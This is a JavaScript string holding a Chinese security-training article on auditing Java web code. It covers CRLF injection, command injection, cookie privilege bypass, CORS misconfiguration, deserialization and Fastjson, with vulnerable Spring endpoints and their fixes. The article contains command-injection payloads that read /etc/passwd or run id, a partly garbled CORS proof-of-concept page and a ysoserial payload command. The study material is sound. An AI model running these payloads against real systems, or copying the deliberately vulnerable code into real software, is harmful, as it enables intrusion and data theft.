const e=`# \u3010\u504F\u9776\u573A\u6559\u5B66\u3011\u6587\u7AE0 - Java-Sec\u4EE3\u7801\u5BA1\u8BA1\u6F0F\u6D1E\u7BC7(\u4E00)  - \u5148\u77E5\u793E\u533A

Created: March 26, 2025 11:56 AM
URL: https://xz.aliyun.com/news/15669
\u6587\u7AE0\u4E8C\u7EA7\u7C7B\u522B: 0Day\u6316\u6398-\u6CE8\u610F\u56FE\u7247\u624B\u52A8\u62D6\u8FDB\u6765
\u6587\u7AE0\u7C7B\u522B(\u6839\u636EWebStorm\u7684\u76EE\u5F55\u6765): \u4EE3\u7801\u5BA1\u8BA1

## \u524D\u8A00

\u672C\u6587\u5F00\u59CB\u901A\u8FC7\u5B66\u4E60Java\u4EE3\u7801\u5BA1\u8BA1\u6F0F\u6D1E\u7684\u4EE3\u7801\u5F62\u5F0F\uFF0C\u8BE6\u7EC6\u8BB2\u89E3\uFF1ACommand Inject \u3001 Broken Access Control \u3001Cors \u3001CRLFInjection\u3001Deserialize \u548C\u8D8A\u6743\u6F0F\u6D1E\u7B49\u8FD9\u4E9B\u5B9E\u9645Java\u5E94\u7528\u6316\u6D1E\u7684\u4E00\u4E9B\u7ECF\u5178\u4EE3\u7801\u6F0F\u6D1E\u4EE5\u53CA\u5BF9\u5E94\u7684\u4FEE\u590D\u5B66\u4E60\uFF0C\u540E\u7EED\u4E5F\u4F1A\u4E0D\u65AD\u5B66\u4E60\u66F4\u65B0Java\u4EE3\u7801\u6F0F\u6D1E\u5BA1\u8BA1\u7EED\u7BC7...

## CRLFInjection

CRLF\u662F\u201D\u56DE\u8F66+\u6362\u884C\u201D(\\r\\n)(\u7F16\u7801\u540E\u662F%0D%0A)\u7684\u7B80\u79F0,\u5728HTTP\u4E2D,HTTP Header\u548CHTTP Body\u662F\u7528\u4E24\u4E2ACRLF\u6765\u5206\u5272\u7684\u3002\u6D4F\u89C8\u5668\u5C31\u662F\u6839\u636E\u8FD9\u4E24\u4E2ACRLF\u6765\u53D6\u51FAHTTP \u5185\u5BB9\u5E76\u663E\u793A\u51FA\u6765\u3002\u6240\u4EE5\uFF0C\u4E00\u65E6\u6211\u4EEC\u80FD\u591F\u63A7\u5236HTTP \u6D88\u606F\u5934\u4E2D\u7684\u5B57\u7B26\uFF0C\u6CE8\u5165\u4E00\u4E9B\u6076\u610F\u7684\u6362\u884C\uFF0C\u8FD9\u6837\u6211\u4EEC\u5C31\u80FD\u6CE8\u5165\u4E00\u4E9B\u4F1A\u8BDDCookie\u6216\u8005HTML\u4EE3\u7801\uFF0C\u6240\u4EE5CRLF Injection\u53C8\u53EBHTTP Response Splitting\uFF0C\u7B80\u79F0HRS\u3002

\u8BBF\u95EE

\`\`\`
http://localhost:8080/crlf/safecode?test1=111%0d%0ax&test2=111%0d%0a111
\`\`\`

\u6F0F\u6D1E\u4EE3\u7801

@Controller
@RequestMapping("/crlf")
public class CRLFInjection {
@RequestMapping("/safecode")
@ResponseBody
public void crlf(HttpServletRequest request, HttpServletResponse response) {
response.addHeader("test1", request.getParameter("test1"));
response.setHeader("test2", request.getParameter("test2"));
String author = request.getParameter("test3");
Cookie cookie = new Cookie("test3", author);
response.addCookie(cookie);
}
}

\u4F46\u8FD9\u4E2A\u95EE\u9898\u5B9E\u9645\u4E0A\u5DF2\u7ECF\u5728\u6240\u6709\u7684\u73B0\u5728\u7684java EE\u5E94\u7528\u670D\u52A1\u5668\u4E0A\u4FEE\u590D\u4E86\u3002

CTF\u7684\u4F8B\u5B50\uFF1A
HCTF2018\u91CC\u9762\u51FA\u4E86\u4E00\u9053bottle\u7684\u9898\u76EE\uFF0C\u5C31\u662F\u5229\u7528\u4E86CRLF\u6CE8\u5165\uFF0C\u5229\u7528\u7684\u662Fbottle\u8FD9\u4E2Apython\u6A21\u5757\u5B58\u5728CRLF\u6F0F\u6D1E\uFF0C\u5177\u4F53\u53EF\u4EE5\u53C2\u8003P\u795E\u7684\u8FD9\u7BC7\u6587\u7AE0:[Bottle HTTP \u5934\u6CE8\u5165\u6F0F\u6D1E\u63A2\u7A76](https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html) \u9898\u76EE\u5141\u8BB8\u6211\u4EEC\u8DF3\u8F6C\u5230\u7AD9\u5185\u7684\u7F51\u7AD9\uFF0C\u9700\u8981\u6CE8\u610F\u7684\u662F\uFF0C\u8FD9\u4E2A\u8DF3\u8F6C\u53EA\u5141\u8BB8\u6211\u4EEC\u8DF3\u8F6C\u523080\u4EE5\u4E0B\u7684\u7AEF\u53E3

### \u53C2\u6570\u6CE8\u5165

\u6F0F\u6D1E\u4EE3\u7801\u5982\u4E0B

@GetMapping("/codeinject")
public String codeInject(String filepath) throws IOException {
String[] cmdList = new String[]{"sh", "-c", "ls -la " + filepath};
ProcessBuilder builder = new ProcessBuilder(cmdList);
builder.redirectErrorStream(true);
Process process = builder.start();
return WebUtils.convertStreamToString(process.getInputStream());
}

\u6CE8\u5165\u622A\u65AD\u5373\u53EF

\`\`\`
codeinject?filepath=/tmp;cat /etc/passwd
\`\`\`

### host\u6CE8\u5165

\u6F0F\u6D1E\u4EE3\u7801

@GetMapping("/codeinject/host")
public String codeInjectHost(HttpServletRequest request) throws IOException {
String host = request.getHeader("host");
logger.info(host);
String[] cmdList = new String[]{"sh", "-c", "curl " + host};
ProcessBuilder builder = new ProcessBuilder(cmdList);
builder.redirectErrorStream(true);
Process process = builder.start();
return WebUtils.convertStreamToString(process.getInputStream());
}

\u653B\u51FB\u6F0F\u6D1E\u5982\u4E0B

\`\`\`
127.0.0.1;id
\`\`\`

tomcat7.9\u4EE5\u4E0A\u7684\u7248\u672C,\u90FD\u4E0D\u652F\u6301\u8BF7\u6C42\u94FE\u63A5\u4E0A\u5E26\u6709\u7279\u6B8A\u5B57\u7B26.\u5426\u5219\u4F1A\u62A5400\u9519\u8BEF,
\u8FD9\u662F\u56E0\u4E3ATomcat\u4E25\u683C\u6309\u7167 RFC 3986\u89C4\u8303\u8FDB\u884C\u8BBF\u95EE\u89E3\u6790\uFF0C\u800C RFC3986\u89C4\u8303\u5B9A\u4E49\u4E86Url\u4E2D\u53EA\u5141\u8BB8\u5305\u542B\u82F1\u6587\u5B57\u6BCD\uFF08a-zA-Z\uFF09\u3001\u6570\u5B57\uFF080-9\uFF09\u3001\`-_.~\`4\u4E2A\u7279\u6B8A\u5B57\u7B26\u4EE5\u53CA\u6240\u6709\u4FDD\u7559\u5B57\u7B26(RFC3986\u4E2D\u6307\u5B9A\u4E86\u4EE5\u4E0B\u5B57\u7B26\u4E3A\u4FDD\u7559\u5B57\u7B26\uFF1A\`! * \u2019 ( ) ; : @ & = + $ , / ? # [ ])\u3002\`

\u4FEE\u590D\u4EE3\u7801\u5982\u4E0B

@GetMapping("/codeinject/sec")
public String codeInjectSec(String filepath) throws IOException {
String filterFilePath = SecurityUtil.cmdFilter(filepath);
if (null == filterFilePath) {
return "Bad boy. I got u.";
}
String[] cmdList = new String[]{"sh", "-c", "ls -la " + filterFilePath};
ProcessBuilder builder = new ProcessBuilder(cmdList);
builder.redirectErrorStream(true);
Process process = builder.start();
return WebUtils.convertStreamToString(process.getInputStream());
}

\u81EA\u5B9A\u4E49\u68C0\u67E5\u7C7B\u5982\u4E0B

public class SecurityUtil {
private static final Pattern FILTER_PATTERN = Pattern.compile("^[a-zA-Z0-9_/\\\\.-]+$");
}

## \u8D8A\u6743\u6F0F\u6D1E

\u4E00\u4E9B\u5E94\u7528\u7684cookie\u662F\u660E\u6587\uFF0C\u53EF\u4EE5\u76F4\u63A5\u6784\u9020\u8D8A\u6743\u767B\u5F55\uFF0C\u4E3E\u4F8B\u4E00\u4E9B\u6F0F\u6D1E\u4EE3\u7801\u5982\u4E0B\uFF1A

@RestController
@RequestMapping("/cookie")
public class Cookies {
private static String NICK = "nick";
@GetMapping(value = "/vuln01")
public String vuln01(HttpServletRequest req) {
String nick = WebUtils.getCookieValueByName(req, NICK); // key code
return "Cookie nick: " + nick;
}
@GetMapping(value = "/vuln02")
public String vuln02(HttpServletRequest req) {
String nick = null;
Cookie[] cookie = req.getCookies();
if (cookie != null) {
nick = getCookie(req, NICK).getValue();  // key code
}
return "Cookie nick: " + nick;
}
@GetMapping(value = "/vuln03")
public String vuln03(HttpServletRequest req) {
String nick = null;
Cookie cookies[] = req.getCookies();
if (cookies != null) {
for (Cookie cookie : cookies) {
// key code. Equals can also be equalsIgnoreCase.
if (NICK.equals(cookie.getName())) {
nick = cookie.getValue();
}
}
}
return "Cookie nick: " + nick;
}
@GetMapping(value = "/vuln04")
public String vuln04(HttpServletRequest req) {
String nick = null;
Cookie cookies[] = req.getCookies();
if (cookies != null) {
for (Cookie cookie : cookies) {
if (cookie.getName().equalsIgnoreCase(NICK)) {  // key code
nick = cookie.getValue();
}
}
}
return "Cookie nick: " + nick;
}
@GetMapping(value = "/vuln05")
public String vuln05(@CookieValue("nick") String nick) {
return "Cookie nick: " + nick;
}
@GetMapping(value = "/vuln06")
public String vuln06(@CookieValue(value = "nick") String nick) {
return "Cookie nick: " + nick;
}
}

## Cors

### \u539F\u7406\u4E0E\u5DE5\u4F5C\u6D41\u7A0B

CORS\uFF08Cross-Origin Resource Sharing\uFF09\u8DE8\u6E90\u8D44\u6E90\u5171\u4EAB\uFF0C\u662FHTML5\u7684\u4E00\u4E2A\u65B0\u7279\u6027\uFF0C\u5176\u601D\u60F3\u662F\u4F7F\u7528\u81EA\u5B9A\u4E49\u7684HTTP\u5934\u90E8\u8BA9\u6D4F\u89C8\u5668\u4E0E\u670D\u52A1\u5668\u8FDB\u884C\u6C9F\u901A\uFF0C\u5B83\u5141\u8BB8\u6D4F\u89C8\u5668\u5411\u8DE8\u57DF\u670D\u52A1\u5668\u53D1\u51FAXMLHttpRequest\u8BF7\u6C42\uFF0C\u4ECE\u800C\u514B\u670DAJAX\u53EA\u80FD\u540C\u6E90\u4F7F\u7528\u7684\u9650\u5236\u3002

CORS\u7684\u57FA\u672C\u539F\u7406\u662F\uFF0C\u7B2C\u4E09\u65B9\u7F51\u7AD9\u670D\u52A1\u5668\u751F\u6210\u8BBF\u95EE\u63A7\u5236\u7B56\u7565\uFF0C\u6307\u5BFC\u7528\u6237\u6D4F\u89C8\u5668\u653E\u5BBD SOP \u7684\u9650\u5236\uFF0C\u5B9E\u73B0\u4E0E\u6307\u5B9A\u7684\u76EE\u6807\u7F51\u7AD9\u5171\u4EAB\u6570\u636E\u3002

\u76F8\u6BD4\u4E4B\u4E0B\uFF0CCORS\u8F83JSONP\u66F4\u4E3A\u590D\u6742\uFF0CJSONP\u53EA\u80FD\u7528\u4E8E\u83B7\u53D6\u8D44\u6E90\uFF08\u5373\u53EA\u8BFB\uFF0C\u7C7B\u4F3C\u4E8EGET\u8BF7\u6C42\uFF09\uFF0C\u800CCORS\u652F\u6301\u6240\u6709\u7C7B\u578B\u7684HTTP\u8BF7\u6C42\uFF0C\u529F\u80FD\u5B8C\u5584\u3002

CORS\u5177\u4F53\u5DE5\u4F5C\u6D41\u7A0B\u53EF\u5206\u4E3A\u4E09\u6B65\uFF0C

1. \u8D44\u6E90\u670D\u52A1\u5668\u6839\u636E\u8BF7\u6C42\u4E2DOrigin\u5934\u8FD4\u56DE\u8BBF\u95EE\u63A7\u5236\u7B56\u7565(Access-Control-Allow-Origin\u54CD\u5E94\u5934)\uFF0C\u5E76\u5728\u5176\u4E2D\u58F0\u660E\u5141\u8BB8\u8BFB\u53D6\u54CD\u5E94\u5185\u5BB9\u7684\u6E90\uFF1B
2. \u6D4F\u89C8\u5668\u68C0\u67E5\u8D44\u6E90\u670D\u52A1\u5668\u5728Access-Control-Allow-Origin\u5934\u4E2D\u58F0\u660E\u7684\u6E90\uFF0C\u662F\u5426\u4E0E\u8BF7\u6C42\u65B9\u7684\u6E90\u76F8\u7B26\uFF0C\u5982\u679C\u76F8\u7B26\u5408\uFF0C\u5219\u5141\u8BB8\u8BF7\u6C42\u65B9\u811A\u672C\u8BFB\u53D6\u54CD\u5E94\u5185\u5BB9\uFF0C\u5426\u5219\u4E0D\u5141\u8BB8\uFF1B

\u53C2\u8003\uFF1A[CORS\u8DE8\u57DF\u6F0F\u6D1E\u603B\u7ED3 [ Mi1k7ea ]](https://www.mi1k7ea.com/2019/08/18/CORS%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#0x01-CORS%E7%9B%B8%E5%85%B3%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5)

### CORS\u4E0ECSRF\u7684\u533A\u522B

\u4E00\u822C\u6709CORS\u6F0F\u6D1E\u7684\u5730\u65B9\u90FD\u6709CSRF\u3002

CSRF\u4E00\u822C\u4F7F\u7528form\u8868\u5355\u63D0\u4EA4\u8BF7\u6C42\uFF0C\u800C\u6D4F\u89C8\u5668\u662F\u4E0D\u4F1A\u5BF9form\u8868\u5355\u8FDB\u884C\u540C\u6E90\u62E6\u622A\u7684\uFF0C\u56E0\u4E3A\u8FD9\u662F\u65E0\u54CD\u5E94\u7684\u8BF7\u6C42\uFF0C\u6D4F\u89C8\u5668\u8BA4\u4E3A\u65E0\u54CD\u5E94\u8BF7\u6C42\u662F\u5B89\u5168\u7684\u3002

\u6D4F\u89C8\u5668\u7684\u540C\u6E90\u7B56\u7565\u7684\u672C\u8D28\u662F\uFF1A\u4E00\u4E2A\u57DF\u540D\u7684JS\uFF0C\u5728\u672A\u7ECF\u5141\u8BB8\u7684\u60C5\u51B5\u4E0B\u662F\u4E0D\u5F97\u8BFB\u53D6\u53E6\u4E00\u4E2A\u57DF\u540D\u7684\u5185\u5BB9\uFF0C\u4F46\u6D4F\u89C8\u5668\u5E76\u4E0D\u963B\u6B62\u5411\u53E6\u4E00\u4E2A\u57DF\u540D\u53D1\u9001\u8BF7\u6C42\u3002

\u76F8\u540C\u70B9\uFF1A\u90FD\u9700\u8981\u7B2C\u4E09\u65B9\u7F51\u7AD9\uFF1B\u90FD\u9700\u8981\u501F\u52A9Ajax\u7684\u5F02\u6B65\u52A0\u8F7D\u8FC7\u7A0B\uFF1B\u4E00\u822C\u90FD\u9700\u8981\u7528\u6237\u767B\u5F55\u76EE\u6807\u7AD9\u70B9\u3002

\u4E0D\u540C\u70B9\uFF1A\u4E00\u822CCORS\u6F0F\u6D1E\u7528\u4E8E\u8BFB\u53D6\u53D7\u5BB3\u8005\u7684\u654F\u611F\u4FE1\u606F\uFF0C\u83B7\u53D6\u8BF7\u6C42\u54CD\u5E94\u7684\u5185\u5BB9\uFF1B\u800CCSRF\u5219\u662F\u8BF1\u4F7F\u53D7\u5BB3\u8005\u70B9\u51FB\u63D0\u4EA4\u8868\u5355\u6765\u8FDB\u884C\u67D0\u4E9B\u654F\u611F\u64CD\u4F5C\uFF0C\u4E0D\u7528\u83B7\u53D6\u8BF7\u6C42\u54CD\u5E94\u5185\u5BB9\u3002

\u7531\u4E8E\u4EE3\u7801\u9650\u5236\u4E0D\u4E25\u683C\uFF0C\u4F1A\u5BFC\u81F4\u8DE8\u57DF\u8BF7\u6C42\u4F2A\u9020\u53EF\u4EE5\u7ED3\u5408xss\uFF0Ccsrf\u8FDB\u884C\u653B\u51FB
\u524D\u7AEF\u53D1\u8D77AJAX\u8BF7\u6C42\u90FD\u4F1A\u53D7\u5230\u540C\u6E90\u7B56\u7565\uFF08CORS\uFF09\u7684\u9650\u5236\u3002\u53D1\u8D77AJAX\u8BF7\u6C42\u7684\u65B9\u6CD5\uFF1A

- XMLHttpRequest
- JQuery\u7684\`$.ajax\`
- Fetch

\u524D\u7AEF\u5728\u53D1\u8D77AJAX\u8BF7\u6C42\u65F6\uFF0C\u540C\u57DF\u6216\u8005\u76F4\u63A5\u8BBF\u95EE\u7684\u60C5\u51B5\u4E0B\uFF0C\u56E0\u4E3A\u6CA1\u6709\u8DE8\u57DF\u7684\u9700\u6C42\uFF0C\u6240\u4EE5Request\u7684Header\u4E2D\u7684Origin\u4E3A\u7A7A\u3002\u6B64\u65F6\uFF0C\u5982\u679C\u540E\u7AEF\u4EE3\u7801\u662F\`response.setHeader("Access-Control-Allow-Origin", origin)\`\uFF0C\u90A3\u4E48Response\u7684header\u4E2D\u4E0D\u4F1A\u51FA\u73B0\`Access-Control-Allow-Origin\`\uFF0C\u56E0\u4E3AOrigin\u4E3A\u7A7A\u3002

\u6F0F\u6D1E\u4EE3\u7801\uFF1A

private static String info = "{\\"name\\": \\"tom\\", \\"phone\\": \\"18200001111\\"}";
@GetMapping("/vuln/origin")
public String vuls1(HttpServletRequest request, HttpServletResponse response) {
String origin = request.getHeader("origin");
response.setHeader("Access-Control-Allow-Origin", origin); // set origin from header
response.setHeader("Access-Control-Allow-Credentials", "true");  // allow cookie
return info;
}
@GetMapping("/vuln/setHeader")
public String vuls2(HttpServletResponse response) {
// \u540E\u7AEF\u8BBE\u7F6EAccess-Control-Allow-Origin\u4E3A*\u7684\u60C5\u51B5\u4E0B\uFF0C\u8DE8\u57DF\u7684\u65F6\u5019\u524D\u7AEF\u5982\u679C\u8BBE\u7F6EwithCredentials\u4E3Atrue\u4F1A\u5F02\u5E38
response.setHeader("Access-Control-Allow-Origin", "*");
return info;
}

\u9700\u8981cookie\u6765\u5229\u7528\u65E0cooike\u7684poc\u5982\u4E0B

GET\uFF1A

<html>
<head>
<title>CORS TEST</title>
</head>
<body>

POST\uFF1A

<html>
<head>
<title>CORS TEST</title>
</head>
<body>
<div id='output'></div>
<script type="text/javascript">
var req = new XMLHttpRequest();
var data = "userId%3Dadmin";
req.onload = reqListener;
req.open('post','http://vuln.com/xxxx',true);
req.setRequestHeader("Content-Type","xxx");
req.withCredentials = true;
req.send(data);
function reqListener() {
var output = document.getElementById('output');
output.innerHTML = "URL: http://vuln.com/xxxx
Data: userId%3Dadmin
Response:

\`\`\`
        };  
<\/script\\>  
\`\`\`

</body>
</html>

\u4FEE\u590D\u4EE3\u7801

/**
* \u91CD\u5199Cors\u7684checkOrigin\u6821\u9A8C\u65B9\u6CD5
* \u652F\u6301\u81EA\u5B9A\u4E49checkOrigin\uFF0C\u8BA9\u5176\u989D\u5916\u652F\u6301\u4E00\u7EA7\u57DF\u540D
* \u4EE3\u7801\uFF1Aorg/joychou/security/CustomCorsProcessor
*/
@CrossOrigin(origins = {"joychou.org", "http://test.joychou.me"})
@GetMapping("/sec/crossOrigin")
public String secCrossOrigin() {
return info;
}
/**
* WebMvcConfigurer\u8BBE\u7F6ECors
* \u652F\u6301\u81EA\u5B9A\u4E49checkOrigin
* \u4EE3\u7801\uFF1Aorg/joychou/config/CorsConfig.java
*/
@GetMapping("/sec/webMvcConfigurer")
public CsrfToken getCsrfToken_01(CsrfToken token) {
return token;
}
/**
* spring security\u8BBE\u7F6Ecors
* \u4E0D\u652F\u6301\u81EA\u5B9A\u4E49checkOrigin\uFF0C\u56E0\u4E3Aspring security\u4F18\u5148\u4E8EsetCorsProcessor\u6267\u884C
* \u4EE3\u7801\uFF1Aorg/joychou/security/WebSecurityConfig.java
*/
@GetMapping("/sec/httpCors")
public CsrfToken getCsrfToken_02(CsrfToken token) {
return token;
}
/**
* \u81EA\u5B9A\u4E49filter\u8BBE\u7F6Ecors
* \u652F\u6301\u81EA\u5B9A\u4E49checkOrigin
* \u4EE3\u7801\uFF1Aorg/joychou/filter/OriginFilter.java
*/
@GetMapping("/sec/originFilter")
public CsrfToken getCsrfToken_03(CsrfToken token) {
return token;
}
/**
* CorsFilter\u8BBE\u7F6Ecors\u3002
* \u4E0D\u652F\u6301\u81EA\u5B9A\u4E49checkOrigin\uFF0C\u56E0\u4E3AcorsFilter\u4F18\u5148\u4E8EsetCorsProcessor\u6267\u884C
* \u4EE3\u7801\uFF1Aorg/joychou/filter/BaseCorsFilter.java
*/
@RequestMapping("/sec/corsFilter")
public CsrfToken getCsrfToken_04(CsrfToken token) {
return token;
}
@GetMapping("/sec/checkOrigin")
public String seccode(HttpServletRequest request, HttpServletResponse response) {
String origin = request.getHeader("Origin");
// \u5982\u679Corigin\u4E0D\u4E3A\u7A7A\u5E76\u4E14origin\u4E0D\u5728\u767D\u540D\u5355\u5185\uFF0C\u8BA4\u5B9A\u4E3A\u4E0D\u5B89\u5168\u3002
// \u5982\u679Corigin\u4E3A\u7A7A\uFF0C\u8868\u793A\u662F\u540C\u57DF\u8FC7\u6765\u7684\u8BF7\u6C42\u6216\u8005\u6D4F\u89C8\u5668\u76F4\u63A5\u53D1\u8D77\u7684\u8BF7\u6C42\u3002
if (origin != null && SecurityUtil.checkURL(origin) == null) {
return "Origin is not safe.";
}
response.setHeader("Access-Control-Allow-Origin", origin);
response.setHeader("Access-Control-Allow-Credentials", "true");
return LoginUtils.getUserInfo2JsonStr(request);
}

## Deserialize \u5E8F\u5217\u5316\u4E0E\u53CD\u5E8F\u5217\u5316

Java\u7684ObjectInputStream\u5BF9\u8C61\u7684readObject\u65B9\u6CD5\u5C06\u53CD\u5E8F\u5217\u5316\u6570\u636E\u8F6C\u6362\u4E3Ajava\u5BF9\u8C61\u3002\u4F46\u5F53\u8F93\u5165\u7684\u53CD\u5E8F\u5217\u5316\u7684\u6570\u636E\u53EF\u88AB\u7528\u6237\u63A7\u5236\uFF0C\u90A3\u4E48\u653B\u51FB\u8005\u5373\u53EF\u901A\u8FC7\u6784\u9020\u6076\u610F\u8F93\u5165\uFF0C\u5728\u6B64\u8FC7\u7A0B\u4E2D\u6267\u884C\u6784\u9020\u7684\u4EFB\u610F\u4EE3\u7801\u3002

\u6F0F\u6D1E\u4EE3\u7801

@RequestMapping("/rememberMe/vuln")
public String rememberMeVul(HttpServletRequest request)
throws IOException, ClassNotFoundException {
Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE);
if (null == cookie) {
return "No rememberMe cookie. Right?";
}
String rememberMe = cookie.getValue();
byte[] decoded = Base64.getDecoder().decode(rememberMe);
ByteArrayInputStream bytes = new ByteArrayInputStream(decoded);
ObjectInputStream in = new ObjectInputStream(bytes);
in.readObject();
in.close();
return "Are u ok?";
}

\u4F7F\u7528ysoserial.jar\u751F\u6210payload

\`\`\`
java -jar .\\ysoserial-all.jar CommonsCollections5 "calc"  |base64
\`\`\`

\u4FEE\u590D\u4EE3\u7801\uFF1A

@RequestMapping("/rememberMe/security")
public String rememberMeBlackClassCheck(HttpServletRequest request)
throws IOException, ClassNotFoundException {
Cookie cookie = getCookie(request, Constants.REMEMBER_ME_COOKIE);
if (null == cookie) {
return "No rememberMe cookie. Right?";
}
String rememberMe = cookie.getValue();
byte[] decoded = Base64.getDecoder().decode(rememberMe);
ByteArrayInputStream bytes = new ByteArrayInputStream(decoded);
try {
AntObjectInputStream in = new AntObjectInputStream(bytes);  // throw InvalidClassException
in.readObject();
in.close();
} catch (InvalidClassException e) {
logger.info(e.toString());
return e.toString();
}
return "I'm very OK.";
}

\u4FEE\u590D\u65B9\u5F0F\u662F\u901A\u8FC7Hook resolveClass\u6765\u6821\u9A8C\u53CD\u5E8F\u5217\u5316\u7684\u7C7B

\u5E8F\u5217\u5316\u6570\u636E\u7ED3\u6784\u53EF\u4EE5\u4E86\u89E3\u5230\u5305\u542B\u4E86\u7C7B\u7684\u540D\u79F0\u53CAserialVersionUID\u7684ObjectStreamClass\u63CF\u8FF0\u7B26\u5728\u5E8F\u5217\u5316\u5BF9\u8C61\u6D41\u7684\u524D\u9762\u4F4D\u7F6E\uFF0C\u4E14\u5728readObject\u53CD\u5E8F\u5217\u5316\u65F6\u9996\u5148\u4F1A\u8C03\u7528resolveClass\u8BFB\u53D6\u53CD\u5E8F\u5217\u5316\u7684\u7C7B\u540D\uFF0C\u6240\u4EE5\u8FD9\u91CC\u901A\u8FC7\u91CD\u5199ObjectInputStream\u5BF9\u8C61\u7684resolveClass\u65B9\u6CD5\u5373\u53EF\u5B9E\u73B0\u5BF9\u53CD\u5E8F\u5217\u5316\u7C7B\u7684\u6821\u9A8C

\u8DDF\u8FDB\u67E5\u770B\u91CD\u5199\u7C7B\u4EE3\u7801

/**
* \u53EA\u5141\u8BB8\u53CD\u5E8F\u5217\u5316SerialObject class
*
* \u5728\u5E94\u7528\u4E0A\u4F7F\u7528\u9ED1\u767D\u540D\u5355\u6821\u9A8C\u65B9\u6848\u6BD4\u8F83\u5C40\u9650\uFF0C\u56E0\u4E3A\u53EA\u6709\u4F7F\u7528\u81EA\u5DF1\u5B9A\u4E49\u7684AntObjectInputStream\u7C7B\uFF0C\u8FDB\u884C\u53CD\u5E8F\u5217\u5316\u624D\u80FD\u8FDB\u884C\u6821\u9A8C\u3002
* \u7C7B\u4F3Cfastjson\u901A\u7528\u7C7B\u7684\u53CD\u5E8F\u5217\u5316\u5C31\u4E0D\u80FD\u6821\u9A8C\u3002
* \u4F46\u662FRASP\u662F\u901A\u8FC7HOOK java/io/ObjectInputStream\u7C7B\u7684resolveClass\u65B9\u6CD5\uFF0C\u5168\u5C40\u7684\u68C0\u6D4B\u767D\u540D\u5355\u3002
*
*/
@Override
protected Class<?> resolveClass(final ObjectStreamClass desc)
throws IOException, ClassNotFoundException
{
String className = desc.getName();
// Deserialize class name: org.joychou.security.AntObjectInputStream$MyObject
logger.info("Deserialize class name: " + className);
String[] denyClasses = {"java.net.InetAddress",
"org.apache.commons.collections.Transformer",
"org.apache.commons.collections.functors"};
for (String denyClass : denyClasses) {
if (className.startsWith(denyClass)) {
throw new InvalidClassException("Unauthorized deserialization attempt", className);
}
}
return super.resolveClass(desc);
}

## Fastjson

FastJson\u662F\u4E00\u4E2A\u5F00\u6E90\u7684JSON\u89E3\u6790\u5E93\uFF0C\u80FD\u591F\u89E3\u6790JSON\u683C\u5F0F\u7684\u5B57\u7B26\u4E32\uFF0C\u5E76\u652F\u6301\u5C06Java Bean\u5E8F\u5217\u5316\u4E3AJSON\u5B57\u7B26\u4E32\uFF0C\u6216\u5C06JSON\u5B57\u7B26\u4E32\u53CD\u5E8F\u5217\u5316\u4E3AJava Bean\u3002

\u8981\u5229\u7528\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u9700\u8981\u627E\u5230\u4E00\u6761\u6709\u6548\u7684\u653B\u51FB\u94FE\uFF0C\u6700\u7EC8\u5B9E\u73B0\u4EE3\u7801\u6267\u884C\u7684\u80FD\u529B\uFF0C\u901A\u5E38\u7528\u4E8E\u8FDC\u7A0B\u547D\u4EE4\u6267\u884C\uFF08RCE\uFF09\u3002\u6784\u9020\u89E6\u53D1\u5668\u662F\u5173\u952E\uFF0C\u8FD9\u53EF\u4EE5\u901A\u8FC7\u591A\u79CD\u65B9\u5F0F\u5B9E\u73B0\uFF0C\u6BD4\u5982\u9759\u6001\u4EE3\u7801\u5757\u6216\u6784\u9020\u65B9\u6CD5\u7B49\u3002

Fastjson\u53CD\u5E8F\u5217\u5316\u6F0F\u6D1E\u7684\u6839\u672C\u539F\u56E0\u4E3B\u8981\u6709\u4E24\u4E2A:

- \u5B83\u5141\u8BB8\u7528\u6237\u901A\u8FC7\u201C@type\u201D\u952E\u6307\u5B9A\u4EFB\u610F\u7684\u53CD\u5E8F\u5217\u5316\u7C7B\u540D
- \u5176\u81EA\u5B9A\u4E49\u7684\u53CD\u5E8F\u5217\u5316\u673A\u5236\u4F7F\u7528\u53CD\u5C04\u751F\u6210\u6307\u5B9A\u7C7B\u7684\u5B9E\u4F8B\uFF0C\u5E76\u81EA\u52A8\u8C03\u7528\u5176setter\u548C\u90E8\u5206getter\u65B9\u6CD5\u3002\u653B\u51FB\u8005\u53EF\u4EE5\u6784\u9020\u6076\u610F\u8BF7\u6C42\uFF0C\u4F7F\u5E94\u7528\u7684\u4EE3\u7801\u6267\u884C\u6D41\u8FDB\u5165\u7279\u5B9A\u7684setter\u6216getter\u65B9\u6CD5\uFF0C\u5982\u679C\u8FD9\u4E9B\u65B9\u6CD5\u4E2D\u5B58\u5728\u53EF\u88AB\u5229\u7528\u7684\u903B\u8F91\uFF08\u5373\u201CGadget\u201D\uFF09\uFF0C\u5C06\u5BFC\u81F4\u4E25\u91CD\u7684\u5B89\u5168\u95EE\u9898\u3002

\u867D\u7136\u5B98\u65B9\u91C7\u7528\u4E86\u9ED1\u540D\u5355\u6765\u6821\u9A8C\u53CD\u5E8F\u5217\u5316\u7C7B\u540D\uFF0C\u4F46\u968F\u7740\u65F6\u95F4\u63A8\u79FB\u548C\u81EA\u52A8\u5316\u6F0F\u6D1E\u6316\u6398\u6280\u672F\u7684\u63D0\u5347\uFF0C\u65B0Gadget\u5C42\u51FA\u4E0D\u7A77\uFF0C\u9ED1\u540D\u5355\u7684\u9632\u62A4\u63AA\u65BD\u4EC5\u6CBB\u6807\u4E0D\u6CBB\u672C\uFF0C\u5BFC\u81F4\u4F7F\u7528\u8BE5\u7EC4\u4EF6\u7684\u7528\u6237\u9891\u7E41\u9762\u4E34\u5347\u7EA7\u56F0\u6270\u3002

\u5BF9\u4E8E\u7F16\u7A0B\u4EBA\u5458\u800C\u8A00\uFF0C\u4F7F\u7528Fastjson\u8FDB\u884C\u53CD\u5E8F\u5217\u5316\u65F6\uFF0C\u5E38\u7528\u7684\u65B9\u6CD5\u5305\u62EC\uFF1A

- parse (String text)
- parseObject(String text)
- parseObject(String text, Class clazz)

